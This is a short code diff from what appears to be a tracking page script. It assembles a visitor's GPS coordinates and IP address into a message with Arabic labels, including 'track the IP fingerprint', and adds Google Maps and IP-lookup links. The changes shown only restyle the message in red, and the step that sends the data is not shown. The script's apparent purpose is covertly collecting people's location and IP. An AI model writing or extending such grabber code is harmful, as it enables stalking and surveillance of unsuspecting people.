@@ -28,14 +28,15 @@
     const data = await response.json();
     const ipAddress = data.ip;
 
-    const message = `\nالموقع:\n \n${latitude} ${longitude}\n\nالايبي:\n \n${ipAddress}`;
+    //const message = `\nالموقع:\n \n${latitude} ${longitude}\n\nالايبي:\n \n${ipAddress}`;
+    const message = `\nالموقع:\n \n<span style="color: red;">${latitude} ${longitude}</span>\n\nالايبي:\n \n${ipAddress}`;
 
 
  // Create the message with the clickable link to Google Maps
  
    
     const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-    const clickableLink = `<a href="${locationLink}">اذهب الى الموقع</a>`;
+    const clickableLink = `<a href="${locationLink}" style="color: red;">اللوكيشن</a>`;
 	const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
     const ipLocationNetLink = `<a href="${ipLocationLink}">تتبع بصمة الايبي</a>`;
 
